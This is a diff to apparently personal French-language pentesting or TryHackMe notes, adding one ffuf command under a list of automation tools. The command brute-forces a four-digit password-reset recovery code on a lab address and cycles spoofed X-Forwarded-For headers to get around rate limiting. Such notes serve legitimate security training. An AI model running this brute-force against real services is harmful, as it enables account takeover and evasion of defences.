@@ -47,6 +47,7 @@ en amont, passive recon, technos, rooms thm spécifiques...
      - automation tools
        - ffuf
          - ffuf -w /usr/share/wordlists/dirb/common.txt -u '<target_IP>/prefixe_FUZZ'
+         - ffuf -w count-9999.txt:W1 -w fake_ip_cut.txt:W2 -u "http://10.10.17.93:1337/reset_password.php" -X "POST" -d "recovery_code=W1&s=80" -b "PHPSESSID=mm9nhojjub1jhijne450i9f6gg" -H "X-Forwarded-For: W2" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -mode pitchfork -fw 1 -rate 100 -o output.txt
        - dirb
        - gobuster
        - [nuclei](https://nuclei.projectdiscovery.io/nuclei/get-started/)
